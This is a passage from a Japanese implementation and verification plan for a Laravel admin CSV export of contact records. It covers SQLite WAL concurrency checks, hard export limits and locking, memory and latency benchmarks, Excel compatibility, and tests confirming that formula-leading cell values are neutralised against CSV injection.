   - 既存の `show()` でクエリ文字列を保持する時と同じパターンを踏襲

2. **`test_index_csv_export_link_uses_normalized_filters` 実装時**:
   - フィルター未指定時も `$filters['sort']` にはデフォルト値が入るため、`$exportQuery` が空配列になることはない
   - デフォルト条件では `$exportQuery` が `['sort' => 'created_at-desc']` となり、URL に `sort=created_at-desc` を含むことを確認
   - `route('admin.contacts.export', $exportQuery ?? [])` で安全に処理される

3. **`sanitizeCsvField()` の引数型**:
   - 現行migrationの `name`、`email`、`subject`、`body` はすべてNOT NULLである
   - 実装は `sanitizeCsvField(string $value): string` とし、到達不能なnull分岐を追加しない

4. **外部メモリ計測（§10.3）の実行タイミング**:
   - テスト全体が Green になった直後に実施
   - §10.3で事前に固定した本番相当環境の専用ワーカープロセスで、空、10,000件、100,000件の早期上限超過、100,000件の疎な0件・10,000件一致、60〜64 MiBの低速配信をそれぞれ5回実行する
   - PHP内部の `memory_get_peak_usage()` は外部ハーネスから同じHTTPワーカーの測定区間を制御・取得できないため合格条件に使わない。PHP本体、PDO、SQLite、ネイティブ割り当てを含む新規PHPワーカーの `VmHWM` と測定PHP service cgroup peak、Webサーバー／プロキシの最大RSS、レスポンス用buffer・temp領域をそれぞれ同じscopeの空エクスポートと比較する。worker値とservice全体値を `max()` で混ぜない
   - 通常アプリケーションへ計測hookを加えない。deadline、lease、監査、telemetry、cleanupの故障注入は非本番fault imageだけで行う
   - raw artifactsはcommitせず、manifest hash、commit SHA、image digest、全結果を `docs/benchmarks/csv_export.md` に残す

5. **SQLite 並行性検証の実行環境**:
   - `php artisan serve` の単一リクエスト処理だけで並行性を判定しない
   - 複数リクエストを同時処理できる本番相当のサーバー構成、または独立した複数プロセスから同じファイルベース SQLite に接続して検証する
   - 件数プローブと順序付き本体SELECTを明示的な同一read transaction・同一接続で実行し、その間に別接続がcommitした条件一致行を本体SELECTが参照しないことを確認する
   - 自動テストでは `wal_autocheckpoint=10` と同期フック後の固定20書き込みでcheckpoint圧力を決定的に再現する。本番相当性能試験では2 writer・合計40操作/秒・固定seed・交互INSERT/UPDATEの負荷を使い、WAL の最大サイズと checkpoint の状態を記録する。生成終了後、read transaction が残らず `PRAGMA wal_checkpoint(TRUNCATE)` が `busy=0` で完了して WAL を切り詰められることを確認する
   - CSV ダウンロードを意図的に低速化した状態でも INSERT / UPDATE と checkpoint が成功し、クライアント配信時間から DB 読み取りが切り離されていることを確認する

6. **同期上限と排他制御**:
   - `csv_export_max_rows=10000`、`csv_export_max_bytes=67108864`、`csv_export_rate_limit=2` は性能テスト用の目安ではなく、環境変数で引き上げられないハード上限とする。環境変数は1以上の安全な値へ引き下げる場合だけ有効とし、過大値はcapする
   - 同期方式を保証する元テーブル件数は100,000件以下とする。100,000件を超える前に実データ分布で再測定し、同じSLOを満たせなければ非同期方式へ移行する
   - 件数プローブはソートを除去し、`id`だけを `LIMIT 10001` で読む。件数超過時に全一致行のソート、本体SELECT、一時ファイル生成へ進まないことをSQLログと性能テストで確認する
   - 件数・バイト上限のどちらを超えても部分CSVを返さず422とし、設定値を変更したテストで件数、ヘッダーだけのバイト数、データ行を含むバイト数の各境界（上限ちょうど／上限+1）を固定する
   - グローバルロックは生成開始から配信終了まで保持し、2件目を待たせず429にする
   - 生成協調期限120秒、要求協調期限540秒、FPM強制上限570秒、TTL600秒を固定し、配信中は60秒ごとにowner付きrefreshを成功させる
   - refresh失敗時は後続chunkを送らず、最終 `expires_at` より前に処理を終える
   - ユーザー単位の毎分2回制限とグローバル同時1件制限は目的が異なるため、どちらも省略しない

7. **I/O抽象化とカバレッジ**:
   - `NativeCsvStreamOperations` は組み込みI/Oへ委譲し、write-all、chunk累積、期限、lease、後処理をexporterへ集約する
   - 短い書き込み、chunk短縮、0、`false`、例外、切断を独立して発生させ、`Content-Length` と累積処理byteが一致することを確認する
   - 主例外をclose、監査、telemetry、解放失敗で上書きせず、各後処理を一度だけ実行する
   - PCOVの `php artisan test --coverage --min=100` で全クラスの**行カバレッジ**100.0%を維持する。PCOVは分岐・パスカバレッジを計測しないため、分岐網羅は§6のテスト一覧との対応表で確認し、行カバレッジ100%を分岐カバレッジ100%とは表現しない

### 実装開始チェックリスト

実装を開始する前に、以下を確認してください：

- [ ] `git status` がクリーンであることを確認
- [ ] レビュー反映commit直後の `git rev-parse HEAD` を `BASELINE_SHA` として記録したことを確認
- [ ] 記録した `BASELINE_SHA` と実装開始時の `git rev-parse HEAD` が一致することを確認
- [ ] TDD ステップ1で SQLite の WAL / busy timeout をコード固定し、外部環境値で緩和されないことをファイルSQLiteの実PRAGMAで確認する
- [ ] 実PRAGMA不一致を接続設定だけで見逃さず、監査・lock・Contact SELECTより前に503とする
- [ ] TDD ステップ2で上限、TTL600、refresh60、生成120、要求540、chunk256 KiBをコード固定する
- [ ] TDD ステップ3でowner付き取得・refresh・releaseと実SQLite競合を固定する
- [x] 正式な出荷先を単一ホスト・永続ローカルSQLiteとし、ADR-001、`CLAUDE.md`、`README.md` に反映する
- [ ] TDD ステップ5の Red テスト `test_unauthenticated_user_cannot_export_csv` からHTTPエクスポート経路の実装を開始する
- [ ] TDD ステップ7でvalidator→監査→lock→exporterの順序、監査鍵の検証、監査fail-closed、環境不適合503、競合429をGreenにする
- [ ] TDD ステップ8ではGreenになったadmin経路にユーザー単位RateLimiterを追加し、同一ユーザーの超過429と別ユーザーへの非干渉を固定する
- [ ] 同期上限、ユーザー単位レート制限、グローバルロックを先に設定し、無制限のエクスポート経路を作らない
- [ ] TDD ステップ12で `index()`、`show()`、`export()` の共通クエリビルダー統合を完了し、次PRへ延期しない
- [ ] TDD ステップ13で同一スナップショットの順序なし件数プローブ、固定書き込み負荷とcheckpoint回復、上限内だけの順序付き本体SELECT、BOM・ヘッダー直後を含むバイト上限をテストし、ステップ14で配信前のDBカーソル解放とロック寿命をテストする
- [ ] TDD ステップ14〜15でchunk、切断、deadline、lease更新、監査、telemetry、transaction解消、主例外保持をGreenにしてからUIへ進む
- [ ] CSV上限422は専用ビューから直接返し、グローバルな `errors/422.blade.php` を作成しない
- [ ] TDD ステップ20で追加予定59テストメソッドと既存97テストを含む全回帰suiteをGreenにし、リファクタではGreenになった挙動を変更しない
- [ ] TDD ステップ21でSLO、実PRAGMA、FPM強制終了、未完了監査watchdog、lease、監査trigger／retention、telemetry、全warning／pageを受信確認する

## 10. 検証方法

1. `vendor/bin/pint` で整形し、`vendor/bin/pint --test` が PASS することを確認する。
2. PCOVで `php artisan test --coverage --min=100` を実行し、§6の追加予定59テストメソッドと `BASELINE_SHA` 時点の既存97テストを含む全回帰suiteのPASS・行カバレッジ100.0%を確認する。data provider展開後のtest／assertion数は実行結果を記録し、固定の「全59テスト」とは表現しない。成功、上限、環境、deadline、chunk、lease、監査、telemetry、後処理の分岐matrixも照合する。
3. **基準環境を固定したスモーク・性能テスト**:
   - 任意のローカルPCを出荷判定には使わない。基準環境は本番予定のインスタンス種別・PHPランタイム・依存ロック・Webサーバー構成と同一に固定し、Xdebug無効、同一ホストのローカルSSD、同時リクエストを処理できる2 worker以上とする。本番インスタンスが未確定の場合は、合計CPU 2 vCPU・メモリ1 GiBに固定した専用ベンチマーク構成で、`php_measured` / `php_peer` をそれぞれmaster + 1 FPM workerの別コンテナ／別cgroupとして起動し、Nginxから明示的に振り分ける。通常／fault image digestと実行ホストを固定し、「2 vCPU以上」のような可変条件は使用しない。PHP・SQLiteのパッチバージョン、CPU型番またはクラウドSKU、OPcache、各worker／cgroup構成、ディスク種別、タイムアウト値を実行前に `docs/benchmarks/csv_export.md` へ記録する。
   - manifestでimage、SQLite、lock、cache、backend、PID／cgroup、temp、監査表／trigger、監査鍵version／秘密参照名、telemetry sink、420／540／570／600秒の順序をpreflightする。HMAC鍵の実値はartifactへ出力しない
   - ファイルベース SQLite のDBディレクトリと `-wal` / `-shm` ファイルへ書き込めることを確認する。Laravel 接続で `PRAGMA journal_mode`、`PRAGMA busy_timeout`、`PRAGMA wal_autocheckpoint` を取得し、前2つが `wal`、`5000` であることと自動checkpoint閾値を記録する。各シナリオ開始前に `PRAGMA wal_checkpoint(TRUNCATE)` を実行し、WALサイズを0へ戻して基準点を揃える。
   - フィクスチャは、空、1,000件、10,000件（本文はASCII 2,000文字）、4バイトUTF-8文字を使って生成CSVが60〜64 MiBになる最大バイト近傍、および次の100,000件テーブルを別々に用意する。(a) 全件一致して10,001件目で早期終了する件数超過、(b) `%body_keyword%` が0件一致してプローブと本体SELECTがともに全表を走査するケース、(c) 最後の10,000行だけが `%body_keyword%` に一致してプローブと順序付き本体SELECTがともに全表を走査する疎一致ケース。固定seedと一致行のID範囲を記録し、64 MiB超過は自動テストで422を確認し、生成前の一時領域に128 MiB以上の空きがあることを確認する。フィクスチャ作成時間は測定から除外する。
   - 各シナリオはウォームアップ1回の後、`php_measured` コンテナ/cgroupを再作成して5回実行する。cgroupを再作成できない本番相当stagingでは、測定前のmemory peak reset成功とscope ID不変を検証し、reset不能なら測定失敗とする。ユーザー単位の毎分2回制限を変更・無効化せず、各HTTP測定には事前に作成・認証済みの別管理者IDを割り当てる。認証準備は測定区間外で行い、データとサーバー設定を固定して、`curl --write-out` の `time_starttransfer`、`time_total`、`size_download` とレスポンスヘッダーを保存する。全5回の値と中央値を `docs/benchmarks/csv_export.md` にcommitし、最良値だけを採用しない。
   - 空、10,000件、100,000件の早期上限超過、100,000件の疎な0件・10,000件一致の各実行で、対象FPM workerの `VmRSS` / `VmHWM` と測定PHP service cgroupのmemory peakを外部samplerから取得する。受入条件は、全5回で「workerの `VmHWM` − 同じ測定回・同じPID役割の空エクスポート `VmHWM`」と「測定PHP service cgroup peak − 同じ測定回・同じscopeの空エクスポートcgroup peak」がそれぞれ32 MiB以下であることとし、異なるscopeの値を `max()` で合成しない。採取対象PIDの取り違え、プロセス終了前の最終値欠落、cgroup未初期化、測定cgroupへのpeerや対象外プロセス／要求の混入は測定失敗として非0終了する。`streamedContent()` は性能判定に使わない。
   - 1,000件と10,000件は `created_at-desc`、`created_at-asc`、`status-asc`、`name-asc` の全ソート条件を各5回測定する。生成SLOは `time_starttransfer` で判定し、全実行で1,000件が5秒以内、10,000件が30秒以内とする。PHPの `max_execution_time=0` など無制限設定でも緩和しない。
   - 100,000件の上限超過データも全ソート条件で各5回要求し、全実行で5秒以内に422を返すこと、順序なし・`id`のみ・`LIMIT 10001` のプローブ1回だけが実行されること、本体SELECT・一時ファイル・`Content-Disposition`がないことを確認する。プローブSQLの `EXPLAIN QUERY PLAN` を保存し、要求されたソート条件にかかわらず `ORDER BY` と `USE TEMP B-TREE FOR ORDER BY` がないことを出荷条件とする。
   - 100,000件テーブルの疎な0件一致と10,000件一致を全ソート条件で各5回要求する。0件一致はヘッダーだけ、10,000件一致は全行を正しい順で返し、全実行で `time_starttransfer` 30秒以内、PHPワーカーの外部測定peak差分32 MiB以下とする。プローブと本体SELECT双方の `EXPLAIN QUERY PLAN`、一致トークンが存在しないこと／最後の10,000 IDだけにあることを示すフィクスチャ検証、実行時間を保存し、全表走査やソート用一時B-treeが発生する場合も測定結果として明示してSLO内であることを確認する。
   - 最大byte近傍CSVを256 KiB/sで取得し、memory、buffer、temp、callback完了、lock lease、audit、telemetryを採取する
   - 全5回でpeak差分32 MiB以下、総時間360秒以内、sizeとContent-Length一致、最終行解析成功とする。配信中に60秒ごとのlease延長を確認する
   - 低速配信開始直後に同じ管理者から1回、その後10秒ごとに事前認証済みの未使用管理者IDからエクスポートを要求し、PHPストリームコールバックが完了するまでは全要求が1秒以内に429となり、新しい一時ファイルやDBカーソルを作らないことを確認する。これにより同一ユーザーのRateLimiterによる429とグローバルロックによる429を混同しない。クライアント受信完了後は未使用管理者からの次の要求が成功すること、ロックが別ワーカープロセスからも可視であることを確認し、共有atomic lock非対応のcache storeや、全量bufferingによりクライアント転送中にロックを早期解放する構成では出荷しない。テスト全体を通じてCSV用一時領域の使用量が「64 MiB + 最大1行分」を超えず、終了・切断後に基準値へ戻ることを確認する。
   - ヘッダー後の切断で5秒以内にfinalizerが完了し、`failed`監査と切断telemetryが残ることを確認する
   - fault imageでは短縮deadline／TTLでworker killとblock I/Oを再現する。協調的deadlineの確認点を越えてblockが継続し、FPM強制終了だけが処理を止めることを固定する。FPM terminationが即時pageとなり、アプリの終端監査／`contact_csv_export.finished` がない監査IDをwatchdogが600秒閾値後の次回走査でpageすること、再取得が最終 `expires_at` 後になることを確認する
   - 10,000件CSVの生成中はwriterプロセスを2つ起動し、各20操作/秒（合計40操作/秒）、seed `20260722` で1 INSERTと1 UPDATEを交互に実行する。INSERTはwriter番号と6桁連番の接頭辞を `N` / `S` で右paddingした名前255文字・件名255文字、`w<writer>-<6桁連番>@` + `a` 59文字 + `.` + `b` 50文字 + `.example` という128文字のメールアドレス、`B` 2,000文字の本文に固定する。UPDATEは同じseedで既存IDを選びstatusを交互に変更する。writerはエクスポート開始2秒前からread transaction終了まで動かし、各回のcommit成功数・失敗数・実測レート・p50/p95/max latencyを記録する。WALサイズを100ms間隔で採取し、全5回で各書き込みが5秒以内、WAL最大サイズ64 MiB以下、`database is locked` なしを確認する。生成完了後は `PRAGMA wal_checkpoint(TRUNCATE)` の `busy=0` とWAL切り詰めを確認する。自動テストの `wal_autocheckpoint=10` と固定20書き込みがcheckpoint圧力の決定的な回帰検証を担当し、性能試験側では環境依存の「閾値を必ず超える」を前提にしない。
   - 完成済みCSVの低速配信中にも、公開フォームの INSERT、管理者の UPDATE、`PRAGMA wal_checkpoint(TRUNCATE)` が各5秒以内に成功することを確認する。これにより、配信中はPHPワーカーと一時ファイルだけを保持し、DB read transactionを保持しないことを検証する。
   - stagingで件数／欠測、SLO、deadline、FPM termination、未完了監査watchdog、close、lock refresh／release、audit失敗のwarning／pageを発火し、rule IDと時刻を保存する
   - driver、PRAGMA、期限順序、監査、telemetryを含む条件のいずれかを満たさなければ出荷しない
   - **ハーネス、固定環境定義、出力schemaはcommitする。生成した連絡先DB、CSV、cookie、秘密値、raw artifactsはcommitしない。manifest hash、ハーネスcommit SHA、再実行コマンド、全5回の測定結果、監視通知証跡は `docs/benchmarks/csv_export.md` にcommitする。**
4. `composer dev` で開発サーバーを起動し、管理者でログインして以下を確認する。
   - ステータス「対応中」と複数のキーワード/日付/ソート条件を適用し、CSV が一覧と同じ条件の行のみを含む。
   - `?statuses=in_progress` を付けて一覧を開いた場合も、エクスポートリンクは正規化後の「対応中」を引き継ぎ、他ステータスの行を含まない。
   - Ajax 絞り込み後もボタンが表示され、現在条件の href に更新される。
   - `page`/`per_page` の値に関わらず、条件に一致する全件が出力される。
   - 通常の上限内データでボタンをクリックすると200応答の `Content-Disposition: attachment` によりCSVが1件ダウンロードされ、一覧画面に留まる。
   - unsupported driver、WAL以外、busy timeout不一致、監査HMAC鍵／version不適合で503となり、監査、lock、Contact SELECT、一時ファイルが発生しない。
   - UTC/JSTの日付境界でファイル名が表示timezoneの日付になる。
   - テスト用設定で件数上限またはヘッダーだけのバイト上限を超過させてボタンをクリックすると、同じタブに422の案内画面が表示され、ダウンロードイベントや新規ファイルが発生しない。
   - 別リクエストでグローバルロックを保持した状態でボタンをクリックすると、同じタブに429画面が表示され、ダウンロードイベントや新規ファイルが発生しない。
   - 320px viewport でページ全体の横スクロールが発生せず、エクスポートボタンの操作領域が44px以上である。
5. 日本語、絵文字、カンマ、ダブルクォート、CRLF/LF、バックスラッシュ＋ダブルクォートを含む必須テストデータを作成する。ダウンロードした CSV を対象の Windows/Mac 版 Microsoft Excel でダブルクリックして開き、文字コード指定なしで文字化けや列ずれがないことを確認する。
6. `=`,`+`,`-`,`@`,`\t`,`\r`,`\n`,`＝`,`＋`,`－`,`＠` で始まる値を名前・メールアドレス・件名・本文に配置した必須テストデータを用意する。Excel で開いた時点で数式が実行されず文字列として表示されること、そのまま CSV 形式で保存・閉じる・再オープンしても数式が実行されないことを確認する。
7. **スクリーンショット・GIF 更新**（`CLAUDE.md` の UI 変更ルール準拠）:
   - `screenshots/admin_dashboard.jpg` — 管理画面一覧の最上部（CSV エクスポートボタン追加箇所）を含む全体図を再撮影
   - `screenshots/demo_admin_dashboard.gif` — 管理画面でのフィルター適用後、CSV エクスポートボタンのクリックと GIF 処理のデモを含む操作フローを再撮影。カーソル移動・クリック波紋演出付き
   - 更新済みファイルを確認してから commit する。

## 11. 参考資料

- [PHP Manual: `fputcsv`](https://www.php.net/fputcsv) — `escape` の明示指定、独自エスケープと RFC 4180 互換性
- [PHP Manual: `tmpfile`](https://www.php.net/tmpfile) — 一時ファイルの作成、クローズ時の自動削除
- [PHP Manual: `fread`](https://www.php.net/fread) — 完成済み一時ファイルのchunk読み出し
- [PHP Manual: `set_time_limit`](https://www.php.net/set-time-limit) — Unix系でstream I/O時間が実行時間に含まれない点
- [PHP Manual: Connection handling](https://www.php.net/manual/en/features.connection-handling.php) — クライアント切断と `ignore_user_abort()` の動作
- [Laravel 13.x: Eloquent Cursors](https://laravel.com/docs/13.x/eloquent#cursors) — `cursor()` の PDO バッファによるメモリ制約と `lazy()`
- [Laravel 13.x: Rate Limiting](https://laravel.com/docs/13.x/rate-limiting) — 名前付きRateLimiterとキー単位の制限
- [Laravel 13.x: Atomic Locks](https://laravel.com/docs/13.x/cache#atomic-locks) — owner付きロックとTTLの参考。lease更新は本計画のSQLite専用実装で定義する
- [SQLite: Isolation In SQLite](https://www.sqlite.org/isolation.html) — rollback journal と WAL の読み書き並行性
- [SQLite: Write-Ahead Logging](https://www.sqlite.org/wal.html) — WAL の動作、同時読み書き、長時間readとcheckpointの制約
- [SQLite: Query Planning](https://www.sqlite.org/queryplanner.html) — `ORDER BY`、索引、ソート処理のクエリ計画
- [PostgreSQL: Transaction Isolation](https://www.postgresql.org/docs/current/transaction-iso.html) — 既定のRead Committedと、将来ドライバ追加時に必要なスナップショット設計
- [MySQL: InnoDB Transaction Isolation Levels](https://dev.mysql.com/doc/refman/8.4/en/innodb-transaction-isolation-levels.html) — 分離レベルごとの一貫読み取りと、将来ドライバ追加時の検証項目
- [HTML Standard: Downloading resources](https://html.spec.whatwg.org/multipage/links.html#downloading-resources) — `download` 属性と通常ナビゲーションの処理モデル
- [PHPUnit: Code Coverage](https://docs.phpunit.de/en/12.5/code-coverage.html) — 行カバレッジと `--path-coverage` の違い
- [PCOV](https://github.com/krakjoe/pcov) — PCOVが提供する行カバレッジ
- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection) — Excel の数式インジェクション対策と保存・再オープン時の注意
